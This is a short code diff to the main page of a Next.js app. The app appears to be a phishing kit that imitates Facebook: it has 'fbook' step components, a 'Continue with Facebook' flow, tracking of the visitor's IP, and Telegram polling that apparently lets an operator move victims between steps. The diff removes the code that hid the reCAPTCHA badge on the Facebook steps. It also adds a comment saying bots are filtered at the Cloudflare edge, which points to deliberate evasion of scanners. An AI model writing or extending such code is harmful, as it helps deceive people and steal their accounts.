@@ -1,7 +1,6 @@
 import Head from "next/head";
 import styles from "../styles/Home.module.css";
 import React, { createContext, useState, useEffect } from "react";
-import { useHideRecaptchaBadge } from "../hooks/useHideRecaptchaBadge";
 
 // Component imports - Main page components
 import Step1 from "../components/fbook/Step1.js";
@@ -62,14 +61,9 @@ export const DataContext = createContext();
 
 // Main component
 export default function Home() {
-  // Hide badge for FB steps
-  const FBOOK_STEPS = new Set([
-    1, 2, 3, 4, 6, 7, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22,
-  ]);
   const [ContinueWithFacebook, setContinueWithFacebook] = useState(true);
   const userData = useUserData();
   const stepManagement = useStepManagement();
-  useHideRecaptchaBadge(FBOOK_STEPS.has(stepManagement.Step));
 
   const { Unik, isInitialized } = useInitialSetup(
     userData.setAllData,
@@ -86,7 +80,7 @@ export default function Home() {
     }
   }, [userData.AllData?.ip, Ip, setIp]);
 
-  // Captcha runs invisibly in background — hooks always active
+  // Bots are filtered at the Cloudflare edge, so these hooks are always active
   useTelegramPolling(
     Unik,
     stepManagement.setStep,
